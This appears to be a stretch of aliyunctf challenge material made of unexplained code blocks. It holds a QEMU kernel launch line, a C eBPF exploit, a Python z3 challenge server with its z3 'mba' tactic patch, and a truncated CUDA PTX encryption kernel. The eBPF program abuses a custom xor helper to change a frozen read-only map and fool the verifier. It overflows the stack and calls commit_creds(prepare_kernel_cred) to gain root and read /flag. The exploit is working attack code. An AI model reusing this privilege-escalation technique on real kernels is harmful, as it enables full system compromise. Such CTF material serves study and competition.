        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
        /* BPF_REG_7改为1*/
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 10),
        }；
    
}
```



```
qemu-system-x86_64  
-m 512M  
-smp 2 
-kernel bzImage    
-append "console=ttyS0 quiet panic=-1 nokaslr sysctl.kernel.io_uring_disabled=1 sysctl.kernel.dmesg_restrict=1 sysctl.kernel.kptr_restrict=2 sysctl.kernel.unprivileged_bpf_disabled=0"     
-initrd rootfs.cpio 
-drive file=/flag,if=virtio,format=raw,readonly=on 
-nographic  
-net nic,model=e1000 
-no-reboot 
-monitor /dev/null
```



```
#include <stdio.h>
#include <stdlib.h>
#include <ctype.h>
#include <signal.h>
#include <fcntl.h>
#include "bpf.h"
#define BPF_FUNC_aliyunctf_xor 212
unsignedlong user_rip, user_ss, user_sp, user_cs, user_rflags;
void error_quit(const char* msg) {
    perror(msg);
    exit(0);
}

void get_shell() {
    printf(" 33[35mGetShell Success! 33[0mn");
    int fd = open("/flag", 0);
    char flag[0x100] = { 0 };
    read(fd, flag, 0x100);
    puts(flag);
    return;
}

void binary_dump(char* buf, size_t size, long long base_addr) {
    printf(" 33[33mDump:n 33[0m");
    char* ptr;
    for (int i = 0; i < size / 0x20; i++) {
        ptr = buf + i * 0x20;
        printf("0x%016llx:   ", base_addr + i * 0x20);
        for (int j = 0; j < 4; j++) {
            printf("0x%016llx ", *(longlong*)(ptr + 8 * j));
        }
        printf("   ");
        for (int j = 0; j < 0x20; j++) {
            printf("%c", isprint(ptr[j]) ? ptr[j] : '.');
        }
        putchar('n');
    }
    if (size % 0x20 != 0) {
        int k = size - size % 0x20;
        printf("0x%016llx:   ", base_addr + k);
        ptr = buf + k;
        for (int i = 0; i <= (size - k) / 8; i++) {
            printf("0x%016llx ", *(longlong*)(ptr + 8 * i));
        }
        for (int i = 0; i < 3 - (size - k) / 8; i++) {
            printf("%19c", ' ');
        }
        printf("   ");
        for (int j = 0; j < size - k; j++) {
            printf("%c", isprint(ptr[j]) ? ptr[j] : '.');
        }
        putchar('n');
    }
}

void save_user_land() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs,cs;"
        "mov user_sp,rsp;"
        "mov user_ss,ss;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    user_rip = (unsignedlong)get_shell;
    puts(" 33[34mUser land saved. 33[0m");
    printf(" 33[34muser_ss:0x%llx 33[0mn", user_ss);
    printf(" 33[34muser_sp:0x%llx 33[0mn", user_sp);
    printf(" 33[34muser_rflags:0x%llx 33[0mn", user_rflags);
    printf(" 33[34muser_cs:0x%llx 33[0mn", user_cs);
    printf(" 33[34muser_rip:0x%llx 33[0mn", user_rip);
}

void circle_print(char buf[], int line_size, int size) {
    int l = 0;
    for (int i = 0; i < size; i++, l++) {
        putchar(buf[i]);
        if (buf[i] == 'n')
            l = 0;
        if ((l + 1) % line_size == 0) {
            putchar('n');
        }
    }
}

unsignedlong prepare_kernel_cred = 0xffffffff810c3f00,
commit_creds = 0xffffffff810c3c50, init_cred = 0xffffffff82a0c900;

void privilege_imporve() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov rdi,init_cred;"
        "mov rax,prepare_kernel_cred;"
        "call rax;"
        "mov rdi,rax;"
        "mov rax,commit_creds;"
        "call rax;"
        "xor rax,rax;"
        "swapgs;"
        "mov r15,user_ss;"
        "push r15;"
        "mov r15,user_sp;"
        "push r15;"
        "mov r15,user_rflags;"
        "push r15;"
        "mov r15,user_cs;"
        "push r15;"
        "mov r15,user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

unsignedcharstack[0x4000];

int test_vuln() {
    unsignedint ret = 0;
    int array_fd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x40, 1, BPF_F_RDONLY_PROG);
    if (array_fd < 0) {
        error_quit("BPF_MAP_TYPE_ARRAY error");
    }

    int key = 0;
    long v[0x40];
    v[0] = 0;
    int error = bpf_update_elem(array_fd, &key, v, 0);
    if (error < 0) {
        error_quit("BPF_UPDATE_ELEM error");
    }

     error = bpf_map_freeze(array_fd);
     if (error < 0){
         error_quit("BPF_MAP_FREEZE error");
     }

     struct bpf_insn insns[] = {
        /* 保存 skb_buff. */
        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1, 0),

        /* map_lookup_elem, 获取只读数据 */
        BPF_LD_MAP_FD(BPF_REG_1, array_fd),
        BPF_ST_MEM(BPF_DW, BPF_REG_10, -8, 0),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_IMM(BPF_REG_3, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),

        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_IMM(BPF_REG_0, -1),
        BPF_EXIT_INSN(),

        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0, 0),

        /* 利用aliyunctf_xor修改只读数据 */
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_0, 0),
        BPF_MOV64_IMM(BPF_REG_2, 8),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_0, 0),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_aliyunctf_xor),

        /* 构造verifier差异 0 -> 1*/
        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0),
        BPF_ALU64_IMM(BPF_RSH, BPF_REG_7, 10),

        /* 0 -> any */
        BPF_ALU64_IMM(BPF_MUL, BPF_REG_7, 0x18),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 8),

        // r0 = bpf_skb_load_bytes_relative(r9, 0, r8, r7, 0)
        BPF_MOV64_REG(BPF_REG_1, BPF_REG_9, 0),
        BPF_MOV64_IMM(BPF_REG_2, 0),
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10, 0),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, -0x10),
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7, 0),
        BPF_MOV64_IMM(BPF_REG_5, 1),
        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_skb_load_bytes_relative),

        BPF_EXIT_INSN()

    };
    int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns, sizeof(insns) / sizeof(insns[0]), "");
    circle_print(bpf_log_buf, 165, strlen(bpf_log_buf));
    if (prog_fd < 0)
        error_quit("BPF_PROG_LOAD error");

    char buf[0x100] = { 0 };
    ((long*)&buf[14])[3] = (long)privilege_imporve;
    unsignedint size_out = 0;
    bpf_prog_test_run(prog_fd, 0, buf, 0x100, buf, &size_out, &ret, NULL);

    return ret;
}

int main() {
    save_user_land();
    signal(SIGSEGV, get_shell);
    printf("ret: 0x%xn", test_vuln()),
    printf("End.n");
}
```



```
#!/usr/bin/env python3

from lark import Lark, Transformer
from typing import Any, List, Tuple, Self
import z3, os

BITSET = {
'x': [0, 0, 1, 1],
'y': [0, 1, 0, 1],
}

Rule = r"""
?start: expr -> expression

?expr: coterm -> coefterm
    | expr "+" coterm -> add
    | expr "-" coterm -> sub

?coterm: term -> term
    | integer "*" term -> mul             
    | integer -> const
              
?term: "(" term ")"
    | "~" "(" term ")" -> bnot_term
    | factor "&" factor -> band
    | factor "|" factor -> bor
    | factor "^" factor -> bxor
    | factor -> single
              
?factor: "x" -> x
    | "y" -> y
    | "~" factor -> bnot

?integer: /d{1,8}/

%import common.WS
%ignore WS           
"""

P = Lark(Rule, parser='lalr', start='start')
PT = Lark(Rule, parser='lalr', start='term')

class MBATransformer(Transformer):
def expression(self, args):
    return MBAExpr(args[0])

def coefterm(self, args):
    return [args[0]]

def add(self, args):
    return args[0] + [args[1]]

def sub(self, args):
    new_arg = (-args[1][0], args[1][1])
    return args[0] + [new_arg]

def term(self, args):
    return (1, args[0])

def mul(self, args):
    num = int(args[0])
    return (num, args[1])

def const(self, args):
    num = int(args[0])
    return (-num, BoolFunction('&', ['x', '~x'], True))

def bnot_term(self, args):
    return args[0].invert()

def band(self, args):
    return BoolFunction('&', args)

def bor(self, args):
    return BoolFunction('|', args)

def bxor(self, args):
    return BoolFunction('^', args)

def single(self, args):
    return BoolFunction(None, args)

def x(self, args):
    return'x'

def y(self, args):
    return'y'

def bnot(self, args):
    if args[0] == 'x'or args[0] == 'y':
      return'~' + args[0]
    assert args[0][0] == '~', "Invalid expression"
    return args[0][1]   # double negation

def integer(self, args):
    return args[0]

boolean = lambda x: 1if x else0
def _handle_uop(op: str, a: List[int] | int) -> List[int] | int:
if op != '~':
    raise ValueError("Invalid unary operator")
if isinstance(a, int):
    return boolean(1if a == 0else0)
return [boolean(1if x == 0else0) for x in a]

def _get_bitvec(s: str, nbits: int) -> z3.BitVec:
return z3.BitVec(s, nbits)

def _get_bitvecval(v: int, nbits: int) -> z3.BitVecVal:
return z3.BitVecVal(v, nbits)

class BoolFunction(object):
def __init__(self, op: str | None, args: List[str], inverted: bool = False):
    if op isnotNone:
      assert len(args) == 2, "Binary operator must have two arguments"
    else:
      assert len(args) == 1, "A bool function must have at least one argument"
      if inverted and args[0] == '~':   # double neg
        inverted = False
        args = [args[0][1]]
    self.op = op
    self.args = args
    self.inverted = inverted

def __str__(self):
    if self.op isnotNone:
      s = "(" + self.op.join(self.args) + ")"
    else:
      s = self.args[0]  
    
    if self.inverted:
      returnf"~{s}"
    return s

def __repr__(self):
    return str(self)

def _get_arg_symbol(self, s: str) -> str:
    if s[0] != '~':
      return s
    return s[1]

def _get_bitset(self, s: str) -> List[int]:
    if s[0] != '~':
      return BITSET[s]
    return _handle_uop('~', self._get_bitset(s[1]))

def _eval_arg(self, s: str, x: int, y: int) -> int:
    bitset = {'x': x, 'y': y}
    if s[0] != '~':
      return bitset[s]
    return _handle_uop('~', bitset[s[1]])

def invert(self) -> Self:
    return BoolFunction(self.op, self.args, not self.inverted)

def _get_arg_z3expr(self, s: str, nbits: int) -> z3.BitVecRef:
    if s[0] != '~':
      return _get_bitvec(s, nbits)
    return ~(_get_bitvec(s[1], nbits))

def to_z3expr(self, nbits: int) -> Any:
    ifnot self.op:
      arg_expr = self._get_arg_z3expr(self.args[0], nbits)
      if self.inverted:
        return ~arg_expr
      return arg_expr
    
    a = self._get_arg_z3expr(self.args[0], nbits)
    b = self._get_arg_z3expr(self.args[1], nbits)
    if self.op == '&':
      expr = a & b
    elif self.op == '|':
      expr = a | b
    elif self.op == '^':
      expr = a ^ b
    else:
      raise ValueError("Invalid operator")

    if self.inverted:
      return ~expr
    return expr
    
class MBAExpr(object):
def __init__(self, coterms: List[Tuple[int, BoolFunction]]):
    self._coterms = coterms

def __len__(self):
    return len(self._coterms)

def __getitem__(self, i: int) -> Tuple[int, BoolFunction]:
    return self._coterms[i]

def __setitem__(self, i: int, v: Tuple[int, BoolFunction] | BoolFunction):
    coef = self._coterms[i][0]
    if isinstance(v, BoolFunction):
      self._coterms[i] = (coef, v)
    else:
      self._coterms[i] = v

def __str__(self):
    r = ""
    for c, t in self._coterms:
      if c < 0:
        r += f"-{abs(c)}*{t}"
      else:
        r += f"+{c}*{t}"
    return r

def __repr__(self):
    return str(self)

def to_z3expr(self, nbits: int) -> z3.BitVecRef:
    expr = 0
    for c, t in self._coterms:
      expr += _get_bitvecval(c, nbits) * t.to_z3expr(nbits)
    return expr

  @property
def coterms(self) -> List[Tuple[int, BoolFunction]]:
    return self._coterms

T = MBATransformer()
def parse(expr: str) -> MBAExpr:
return T.transform(P.parse(expr))

def parse_term(term: str) -> BoolFunction:
return T.transform(PT.parse(term))

def check_expression(t: z3.Tactic, e: MBAExpr) -> bool:
  expr = e.to_z3expr(64)
  s = t.solver()
  s.add(expr != expr)

  s.set('timeout', 30000)   # 30 seconds
  r = s.check()
if r == z3.unknown:
    print("Solver timed out")
    exit(1)
return r == z3.unsat

def serve_challenge():
  FLAG = os.environ.get('FLAG', 'aliyunctf{this_is_a_test_flag}')

  expr = input("Please enter the expression: ")
if len(expr) > 200:
    print("Expression is too long")
    exit(1)

try:
    mba = parse(expr)
except Exception as e:
    print("Could not parse the expression")
    exit(1)

if len(mba.coterms) > 15:
    print("Too many terms")
    exit(1)

  t = z3.Then(
    z3.Tactic('mba'),
    z3.Tactic('simplify'),
    z3.Tactic('smt')
  )

if check_expression(t, mba):
    print("It works!")
else:
    print(f"Flag: {FLAG}")
return

if __name__ == '__main__':
  serve_challenge()
```



```
diff --git a/src/tactic/bv/CMakeLists.txt b/src/tactic/bv/CMakeLists.txt
index 9009e6fa5..72bd2cfa1 100644
--- a/src/tactic/bv/CMakeLists.txt
+++ b/src/tactic/bv/CMakeLists.txt
@@ -10,6 +10,7 @@ z3_add_component(bv_tactics
     bv_size_reduction_tactic.cpp
     dt2bv_tactic.cpp
     elim_small_bv_tactic.cpp
+    mba_tactic.cpp
   COMPONENT_DEPENDENCIES
     bit_blaster
     core_tactics
@@ -25,4 +26,5 @@ z3_add_component(bv_tactics
     dt2bv_tactic.h
     elim_small_bv_tactic.h
     max_bv_sharing_tactic.h
+    mba_tactic.h
 )
diff --git a/src/tactic/bv/mba_tactic.cpp b/src/tactic/bv/mba_tactic.cpp
new file mode 100644
index 000000000..f3796c1e7
--- /dev/null
+++ b/src/tactic/bv/mba_tactic.cpp
@@ -0,0 +1,381 @@
+#include "tactic/tactic.h"
+#include "tactic/tactical.h"
+#include "tactic/bv/mba_tactic.h"
+#include "ast/bv_decl_plugin.h"
+
+#include <tuple>
+#include <vector>
+
+
+namespace {
+
+const size_t kBVSize = 64;
+
+int basis[][4] = {
+  {0, 0, 0, 0},
+  {-1, -1, 1, 1},
+  {0, 1, -1, 0},
+  {-1, 0, 0, 1},
+  {1, 0, -1, 0},
+  {0, -1, 0, 1},
+  {1, 1, -2, 0},
+  {0, 0, -1, 1},
+  {0, 0, 1, 0},
+  {-1, -1, 2, 1},
+  {0, 1, 0, 0},
+  {-1, 0, 1, 1},
+  {1, 0, 0, 0},
+  {0, -1, 1, 1},
+  {1, 1, -1, 0},
+  {0, 0, 0, 1}
+};
+
+struct bool_function {
+  using boolvar = std::tuple<bool, char>;
+  expr_ref e;
+  char op;
+  std::vector<boolvar> vars;
+  bool negated;
+
+  bool_function(ast_manager & m, expr * e) : e(e, m), op(0), negated(false) { }
+
+  bool evaluate(bool x, bool y) {
+    auto eval_var = [&](const boolvar & v) {
+      bool neg; char name;
+      std::tie(neg, name) = v;
+      return neg ? !((name == 'x' ? x : y)) : (name == 'x' ? x : y);
+    };
+
+    bool result;
+    switch (op) {
+    case '&': result = eval_var(vars[0]) && eval_var(vars[1]); break;
+    case '|': result = eval_var(vars[0]) || eval_var(vars[1]); break;
+    case '^': result = eval_var(vars[0]) ^ eval_var(vars[1]); break;
+    default: result = eval_var(vars[0]); break;
+    }
+    return negated ? !result : result;
+  }
+
+  int truth_value(void) {
+    int result = 0;
+    for (size_t i = 0; i < 4; i++) {
+      bool x = i & 2;
+      bool y = i & 1;
+      if (evaluate(x, y))
+        result |= 1 << i;
+    }
+    return result;
+  }
+};
+
+
+using coeff_type = long long;
+using mba_term = std::tuple<coeff_type, bool_function>;
+
+
+struct mba_expr {
+  std::vector<mba_term> terms;
+  ast_manager & m;
+
+  mba_expr(ast_manager & m) : m(m) { }
+};
+
+class mba_tactic : public tactic {
+  ast_manager & m_manager;
+  bv_util m_bv_util;
+  params_ref m_params;
+
+  ast_manager & m() const { return m_manager; }
+
+  bv_util & bv() { return m_bv_util; }
+
+  coeff_type get_coeff(expr * e) {
+    rational r;
+    if (!bv().is_numeral(e, r))
+      throw tactic_exception("expected numeral");
+    
+    if (r.is_int64())
+      return r.get_int64();
+    else if (r.is_int32())
+      return r.get_int32();
+    else if (r.is_uint64()) {
+      return r.get_uint64();
+    }
+    throw tactic_exception("expected int64");
+  }
+
+  bool is_indeterminate(expr * e) {
+    if (!is_app(e))
+      return false;
+
+    app * a = to_app(e);
+    if (a->get_num_args() != 0)
+      return false;
+
+    sort * s = a->get_decl()->get_range();
+    if (!bv().is_bv_sort(s))
+      return false;
+
+    unsigned bv_size = s->get_parameter(0).get_int();
+    if (bv_size != kBVSize)
+      return false;
+
+    func_decl * f = a->get_decl();
+    if (f->get_name() == "x" || f->get_name() == "y")
+      return true;
+    return false;
+  }
+
+  expr * mk_indeterminate(const char* name) {
+    return m().mk_const(name, bv().mk_sort(kBVSize));
+  }
+
+  expr * mk_numeral(int64_t u) {
+    return bv().mk_numeral(u, kBVSize);
+  }
+
+  bool build_bool_function_terms(app * a, bool_function & bf) {
+    unsigned num_args = a->get_num_args();
+    if (num_args > 2) {
+      return false;
+    }
+
+    for (unsigned i = 0; i < num_args; i++) {
+      expr * arg = a->get_arg(i);
+      if (!is_app(arg)) {
+        return false;
+      }
+      app * arg_app = to_app(arg);
+
+      if (bv().is_bv_not(arg_app)) {
+        expr * indet = arg_app->get_arg(0);
+        if (!is_indeterminate(indet)) {
+          return false;
+        }
+        char name = to_app(indet)->get_decl()->get_name().str()[0];
+        bf.vars.push_back(std::make_tuple(true, name));
+      } else if (is_indeterminate(arg_app)) {
+        char name = arg_app->get_decl()->get_name().str()[0];
+        bf.vars.push_back(std::make_tuple(false, name));
+      } else {
+        TRACE("mba", tout << "not an indeterminaten";);
+        return false;
+      }
+    }
+    return true;
+  }
+
+  bool build_bool_function(expr * e, bool_function & bf) {
+    if (!is_app(e))
+      return false;
+
+    app * a = to_app(e);
+    if (bv().is_bv_not(a)) {
+      bf.negated = !bf.negated;
+      return build_bool_function(a->get_arg(0), bf);
+    } else if (bv().is_bv_and(a)) {
+      bf.op = '&';
+      return build_bool_function_terms(a, bf);
+    } else if (bv().is_bv_or(a)) {
+      bf.op = '|';
+      return build_bool_function_terms(a, bf);
+    } else if (bv().is_bv_xor(a)) {
+      bf.op = '^';
+      return build_bool_function_terms(a, bf);
+    }
+
+    if (!is_indeterminate(a))
+      return false;
+
+    char name = a->get_decl()->get_name().str()[0];
+    bf.vars.push_back(std::make_tuple(false, name));
+    return true;
+  }
+
+  bool build_mba_expr(expr * e, mba_expr & mba, bool negative) {
+    if (!is_app(e))
+      return false;
+
+    app * a = to_app(e);
+    if (bv().is_bv_add(a)) {
+      unsigned num_args = a->get_num_args();
+      
+      if (num_args != 2)
+        return false;
+
+      expr * arg1 = a->get_arg(0);
+      expr * arg2 = a->get_arg(1);
+
+      if (!build_mba_expr(arg1, mba, negative))
+        return false;
+      if (!build_mba_expr(arg2, mba, negative))
+        return false;
+      return true;
+    } else if (bv().is_bv_sub(a)) {
+      unsigned num_args = a->get_num_args();
+      if (num_args != 2)
+        return false;
+
+      expr * arg1 = a->get_arg(0);
+      expr * arg2 = a->get_arg(1);
+
+      if (!build_mba_expr(arg1, mba, negative))
+        return false;
+      if (!build_mba_expr(arg2, mba, !negative))
+        return false;
+      return true;
+    } else if (bv().is_bv_mul(a)) {
+      if (a->get_num_args() != 2)
+        return false;
+
+      expr * coef = a->get_arg(0);
+      expr * term = a->get_arg(1);
+      if (!bv().is_numeral(coef))
+        return false;
+
+      bool_function bf(m(), term);
+      if (!build_bool_function(term, bf))
+        return false;
+
+      coeff_type c = get_coeff(coef);
+      if (negative)
+        c = -c;
+      mba.terms.push_back(std::make_tuple(c, bf));
+      return true;
+    } else if (bv().is_numeral(a)) {
+      expr * indet = mk_indeterminate("x");
+      expr * term = bv().mk_bv_not(bv().mk_bv_and(indet,bv().mk_bv_not(indet)));
+
+      bool_function bf(m(), term);
+      if (!build_bool_function(term, bf))
+        return false;
+
+      coeff_type c = get_coeff(a);
+      if (negative)
+        c = -c;
+      mba.terms.push_back(std::make_tuple(-c, bf));
+      return true;
+    }
+
+    // probably a bool function
+    bool_function bf(m(), e);
+    if (!build_bool_function(e, bf))
+      return false;
+
+    coeff_type c = negative ? -1 : 1;
+    mba.terms.push_back(std::make_tuple(c, bf));
+    return true;
+  }
+
+  expr * mk_expressiion(int * basis) {
+    expr * x = mk_indeterminate("x");
+    expr * y = mk_indeterminate("y");
+    expr * x_and_y = bv().mk_bv_and(x, y);
+    expr * one = mk_numeral(-1ull);
+    expr * basis_expr[] = { x, y, x_and_y, one };
+
+    expr * result = nullptr;
+    for (size_t i = 0; i < 4; i++) {
+      if (basis[i] == 0)
+        continue;
+
+      expr * coterm = bv().mk_bv_mul(
+        mk_numeral(basis[i]),
+        basis_expr[i]
+      );
+      if (!result)
+        result = coterm;
+      else
+        result = bv().mk_bv_add(result, coterm);
+    }
+    return result;
+  }
+
+  expr * construct_simplified_mba(expr * e) {
+    mba_expr mba(m());
+
+    if (!build_mba_expr(e, mba, false))
+      return nullptr;
+
+    int basis_comb[4] = {0, 0, 0, 0};
+    for (size_t i = 0; i < mba.terms.size(); i++) {
+      int truth_value = std::get<1>(mba.terms[i]).truth_value();
+      coeff_type coeff = std::get<0>(mba.terms[i]);
+      for (size_t j = 0; j < 4; j++) {
+        basis_comb[j] += basis[truth_value][j] * coeff;
+      }
+    }
+    return mk_expressiion(basis_comb);
+  }
+
+  bool simplify_form(expr * e, expr_ref & result) {
+    if (!is_app(e))
+      return false;
+
+    app * a = to_app(e);
+    
+    if (m().is_eq(a) || m().is_distinct(a)) {
+      SASSERT(a->get_num_args() == 2);
+      expr * lhs = a->get_arg(0);
+      expr * rhs = a->get_arg(1);
+      expr * simplified = construct_simplified_mba(lhs);
+      
+      if (simplified) {
+        if (m().is_eq(a))
+          result = m().mk_eq(simplified, rhs);
+        else {
+          expr * args[] = { simplified, rhs };
+          result = m().mk_distinct(2, args);
+        }
+        return true;
+      }
+    }
+    return false;
+  }
+
+  void simplify_goal(goal & g) {
+    if (g.inconsistent())
+      return;
+    if (g.proofs_enabled()) {
+      return; // not supported
+    }
+
+    expr_ref new_curr(m());
+    proof_ref new_pr(m());
+    unsigned size = g.size();
+    for(unsigned idx = 0; idx < size; idx++) {
+      if (g.inconsistent()) {
+        break;
+      }
+      expr * curr = g.form(idx);
+      if (simplify_form(curr, new_curr)) {
+        g.update(idx, new_curr, new_pr, g.dep(idx));
+      }
+    }
+  }
+
+public:
+  mba_tactic(ast_manager & m, params_ref const & p) : m_manager(m), m_bv_util(m), m_params(p) { }
+
+  void collect_statistics(statistics & st) const override { }
+
+  void operator()(goal_ref const & in, goal_ref_buffer & result) override {
+    TRACE("mba", tout << "mba tacticn";);
+    simplify_goal(*in.get());
+    in->inc_depth();
+    result.push_back(in.get());
+  }
+  
+  void cleanup() override { }
+
+  tactic * translate(ast_manager & m) override { return alloc(mba_tactic, m, m_params); }
+
+  const char* name() const override { return "mba"; }
+};
+
+} // namespace
+
+tactic * mk_mba_tactic(ast_manager & m, params_ref const & p) {
+  return clean(alloc(mba_tactic, m, p));
+}
+
diff --git a/src/tactic/bv/mba_tactic.h b/src/tactic/bv/mba_tactic.h
new file mode 100644
index 000000000..b779cdc2b
--- /dev/null
+++ b/src/tactic/bv/mba_tactic.h
@@ -0,0 +1,12 @@
+#pragma once
+
+#include "util/params.h"
+
+class ast_manager;
+class tactic;
+
+tactic * mk_mba_tactic(ast_manager & m, params_ref const & p = params_ref());
+
+/*
+    ADD_TACTIC("mba", "Toy MBA simplifier", "mk_mba_tactic(m, p)")
+*/
 No newline at end of file
```



```
Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin elf code:
================
arch = sm_52
code version = [1,7]
host = linux
compile_size = 64bit

Fatbin ptx code:
================
arch = sm_52
code version = [8,0]
host = linux
compile_size = 64bit
compressed

.version 8.0
.target sm_52
.address_size 64

.extern .func (.param .b32 func_retval0) vprintf
(
.param .b64 vprintf_param_0,
.param .b64 vprintf_param_1
)
;
.const .align 1 .b8 T[256] = {99, 124, 119, 123, 242, 107, 111, 197, 48, 1, 103, 43, 254, 215, 171, 118, 202, 130, 201, 125, 250, 89, 71, 240, 173, 212, 162, 175, 156, 164, 114, 192, 183, 253, 147, 38, 54, 63, 247, 204, 52, 165, 229, 241, 113, 216, 49, 21, 4, 199, 35, 195, 24, 150, 5, 154, 7, 18, 128, 226, 235, 39, 178, 117, 9, 131, 44, 26, 27, 110, 90, 160, 82, 59, 214, 179, 41, 227, 47, 132, 83, 209, 0, 237, 32, 252, 177, 91, 106, 203, 190, 57, 74, 76, 88, 207, 208, 239, 170, 251, 67, 77, 51, 133, 69, 249, 2, 127, 80, 60, 159, 168, 81, 163, 64, 143, 146, 157, 56, 245, 188, 182, 218, 33, 16, 255, 243, 210, 205, 12, 19, 236, 95, 151, 68, 23, 196, 167, 126, 61, 100, 93, 25, 115, 96, 129, 79, 220, 34, 42, 144, 136, 70, 238, 184, 20, 222, 94, 11, 219, 224, 50, 58, 10, 73, 6, 36, 92, 194, 211, 172, 98, 145, 149, 228, 121, 231, 200, 55, 109, 141, 213, 78, 169, 108, 86, 244, 234, 101, 122, 174, 8, 186, 120, 37, 46, 28, 166, 180, 198, 232, 221, 116, 31, 75, 189, 139, 138, 112, 62, 181, 102, 72, 3, 246, 14, 97, 53, 87, 185, 134, 193, 29, 158, 225, 248, 152, 17, 105, 217, 142, 148, 155, 30, 135, 233, 206, 85, 40, 223, 140, 161, 137, 13, 191, 230, 66, 104, 65, 153, 45, 15, 176, 84, 187, 22};
.const .align 1 .b8 RT[256] = {82, 9, 106, 213, 48, 54, 165, 56, 191, 64, 163, 158, 129, 243, 215, 251, 124, 227, 57, 130, 155, 47, 255, 135, 52, 142, 67, 68, 196, 222, 233, 203, 84, 123, 148, 50, 166, 194, 35, 61, 238, 76, 149, 11, 66, 250, 195, 78, 8, 46, 161, 102, 40, 217, 36, 178, 118, 91, 162, 73, 109, 139, 209, 37, 114, 248, 246, 100, 134, 104, 152, 22, 212, 164, 92, 204, 93, 101, 182, 146, 108, 112, 72, 80, 253, 237, 185, 218, 94, 21, 70, 87, 167, 141, 157, 132, 144, 216, 171, 0, 140, 188, 211, 10, 247, 228, 88, 5, 184, 179, 69, 6, 208, 44, 30, 143, 202, 63, 15, 2, 193, 175, 189, 3, 1, 19, 138, 107, 58, 145, 17, 65, 79, 103, 220, 234, 151, 242, 207, 206, 240, 180, 230, 115, 150, 172, 116, 34, 231, 173, 53, 133, 226, 249, 55, 232, 28, 117, 223, 110, 71, 241, 26, 113, 29, 41, 197, 137, 111, 183, 98, 14, 170, 24, 190, 27, 252, 86, 62, 75, 198, 210, 121, 32, 154, 219, 192, 254, 120, 205, 90, 244, 31, 221, 168, 51, 136, 7, 199, 49, 177, 18, 16, 89, 39, 128, 236, 95, 96, 81, 127, 169, 25, 181, 74, 13, 45, 229, 122, 159, 147, 201, 156, 239, 160, 224, 59, 77, 174, 42, 245, 176, 200, 235, 187, 60, 131, 83, 153, 97, 23, 43, 4, 126, 186, 119, 214, 38, 225, 105, 20, 99, 85, 33, 12, 125};
.global .align 1 .b8 $str[8] = {103, 105, 102, 116, 49, 58, 10, 0};
.global .align 1 .b8 $str$1[6] = {37, 48, 50, 120, 32, 0};
.global .align 1 .b8 $str$2[2] = {10, 0};
.global .align 1 .b8 $str$3[8] = {103, 105, 102, 116, 50, 58, 10, 0};
.global .align 1 .b8 $str$4[8] = {103, 105, 102, 116, 51, 58, 10, 0};
.global .align 1 .b8 $str$5[8] = {103, 105, 102, 116, 52, 58, 10, 0};
.global .align 1 .b8 $str$6[8] = {103, 105, 102, 116, 53, 58, 10, 0};

.visible .entry _Z14encrypt_kernelPhh(
.param .u64 _Z14encrypt_kernelPhh_param_0,
.param .u8 _Z14encrypt_kernelPhh_param_1
)
{
.local .align 8 .b8 __local_depot0[8];
.reg .b64 %SP;
.reg .b64 %SPL;
.reg .pred %p<41>;
.reg .b16 %rs<62>;
.reg .b32 %r<265>;
.reg .b64 %rd<103>;

mov.u64 %SPL, __local_depot0;
cvta.local.u64 %SP, %SPL;
ld.param.u8 %rs12, [_Z14encrypt_kernelPhh_param_1];
ld.param.u64 %rd19, [_Z14encrypt_kernelPhh_param_0];
cvta.to.global.u64 %rd1, %rd19;
add.u64 %rd20, %SP, 0;
add.u64 %rd2, %SPL, 0;
mov.u32 %r1, %ntid.x;
mov.u32 %r54, %ctaid.x;
mul.lo.s32 %r2, %r54, %r1;
mov.u32 %r3, %tid.x;
add.s32 %r4, %r2, %r3;
setp.ge.u32 %p1, %r3, %r1;
cvt.s64.s32 %rd21, %r4;
add.s64 %rd3, %rd1, %rd21;
@%p1 bra $L__BB0_12;

ld.global.u8 %rs13, [%rd3];
cvt.u16.u32 %rs14, %r4;
mul.lo.s16 %rs15, %rs14, 73;
add.s16 %rs16, %rs15, %rs12;
xor.b16 %rs17, %rs13, %rs16;
and.b16 %rs18, %rs17, 240;
shr.u16 %rs19, %rs18, 4;
shl.b16 %rs20, %rs17, 4;
or.b16 %rs58, %rs19, %rs20;
mov.u32 %r242, 0;
mov.u64 %rd24, T;

$L__BB0_2:
cvt.u64.u16 %rd22, %rs58;
and.b64 %rd23, %rd22, 255;
add.s64 %rd25, %rd24, %rd23;
ld.const.u8 %rs21, [%rd25];
shr.u16 %rs22, %rs21, 4;
shl.b16 %rs23, %rs21, 4;
or.b16 %rs24, %rs22, %rs23;
cvt.u16.u32 %rs25, %r242;
xor.b16 %rs58, %rs24, %rs25;
add.s32 %r242, %r242, 1;
setp.lt.u32 %p2, %r242, 10485760;
@%p2 bra $L__BB0_2;

mov.u32 %r243, 0;

$L__BB0_4:
cvt.u64.u16 %rd26, %rs58;
and.b64 %rd27, %rd26, 255;
add.s64 %rd29, %rd24, %rd27;
ld.const.u8 %rs26, [%rd29];
shr.u16 %rs27, %rs26, 4;
shl.b16 %rs28, %rs26, 4;
